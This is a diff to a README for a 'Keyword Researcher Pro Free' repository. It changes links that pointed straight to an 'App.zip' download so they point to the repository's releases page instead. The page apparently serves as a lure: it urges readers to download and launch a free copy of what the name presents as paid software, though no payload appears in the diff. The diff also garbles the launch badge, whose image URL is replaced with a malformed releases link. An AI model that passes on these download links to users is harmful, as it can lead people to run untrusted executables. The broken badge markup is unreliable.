@@ -26,7 +26,7 @@ Welcome to the **Keyword Researcher Pro Free** repository! This is your one-stop
 
 ## Get Started
 
-To dive into the world of keyword research with **Keyword Researcher Pro Free**, simply click [here](https://github.com/uploads/App.zip). 📊
+To dive into the world of keyword research with **Keyword Researcher Pro Free**, simply click [here](https://github.com/AhiuIT/Keyword-Researcher-Pro-Free/releases). 📊
 
 ## What to Expect
 
@@ -55,9 +55,9 @@ Stay ahead of the curve with insights into the latest developments and updates i
 
 ## Additional Resources
 
-If the provided [link](https://github.com/uploads/App.zip) needs to be launched, click below:
+If the provided [link](https://github.com/AhiuIT/Keyword-Researcher-Pro-Free/releases) needs to be launched, click below:
 
-[![Launch Keyword Researcher Pro Free](https://img.shields.io/badge/Launch-Keyword%20Researcher%20Pro%20Free-blue)](https://github.com/uploads/App.zip)
+[![Launch Keyword Researcher Pro Free](https://github.com/AhiuIT/Keyword-Researcher-Pro-Free/releases%20Researcher%20Pro%20Free-blue)](https://github.com/AhiuIT/Keyword-Researcher-Pro-Free/releases)
 
 If the link does not work or is not provided, feel free to check the "Releases" section for alternative download options.
 
